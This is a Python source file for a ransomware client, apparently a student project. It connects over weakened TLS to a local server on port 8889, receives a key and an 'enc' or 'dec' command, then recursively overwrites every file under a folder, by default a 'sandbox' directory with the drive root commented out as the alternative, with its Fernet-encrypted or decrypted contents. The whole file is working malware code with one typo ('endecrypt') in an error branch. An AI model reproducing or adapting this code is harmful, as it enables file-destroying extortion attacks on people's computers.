import ssl
import socket


from cryptography.fernet import Fernet
import base64
import os

LENGTH = 32

def decrypt_file(path , fernet):
    print("decrypting...", path)
    file = open(path, "rb")#reading the file
    data = file.read()#saving data
    if data:
        try:
            file = open(path, "w")#open file in write mode
            file.truncate()#removing previous data
            print(type(data) , data)

            decrypted_data = fernet.decrypt(data)#decrypting previous data

            file.write(decrypted_data.decode())#putting it back
        except:
            file = open(path, "wb")#in case of some diffrent file types
            file.truncate()
            print(type(data) , data)

            decrypted_data = fernet.decrypt(data)

            file.write(decrypted_data)
def encrypt_file(path , fernet):
    print("encrypting...", path)
    file = open(path, "rb")
    data = file.read()
    if data:
        try:
            file = open(path, "w")
            file.truncate()
            print(type(data), data)

            encrypted_data = fernet.encrypt(data)

            file.write(encrypted_data.decode())
        except:
            file = open(path, "wb")
            file.truncate()
            print(type(data), data)

            encrypted_data = fernet.endecrypt(data)

            file.write(encrypted_data)
def create_key(secret):
    return base64.urlsafe_b64encode(secret)#creating a key using the secret
def browse_all_files(path , fernet , reverse):
    if path:
        print("checking ,",path)
        if(os.path.isfile(path)):#if file decrypt\encrypt
            if(reverse == False):
                encrypt_file(path,fernet)
            else:
                decrypt_file(path , fernet)

        elif(os.path.isdir(path)):#continue walking through directories
            list_dir = os.listdir(path)
            for filename in list_dir:
                browse_all_files(path+"/"+filename , fernet , reverse)



def main():

    try:
        #path =  os.getcwd()[:3]#this gets the root of the pc`s file explorer
        path =r"C:\Users\User\OneDrive\Desktop\לימודים\מועדון המתכנתים\sandbox"#path for debbuging
        print(os.listdir(path))
        print(path)
        context = ssl.SSLContext(protocol=ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        ssl_socket = context.wrap_socket(client_socket, server_hostname="none")
        context.set_ciphers("ALL:@SECLEVEL=0")

        while True:
            try:
                ssl_socket.connect(("127.0.0.1", 8889))#tries to connect to server using ssl
                break
            except:
                pass


        secret = ssl_socket.recv(LENGTH)#getting the secret
        command = ssl_socket.recv(3).decode()# getting command decrypt\encrypt
        print(command)
        print(secret)
        key = create_key(secret)#creating a key using the secret
        fernet = Fernet(key)#
        secret = None#deleting secret
        reverse = False
        if(command == 'dec'):
            reverse = True

        browse_all_files(path,fernet , reverse=reverse)#reverse is true for decryption false is encryption
        print("all file are now: {}rypted".format(command))

    except Exception as e:
        print(e)
if __name__ == "__main__":
    main()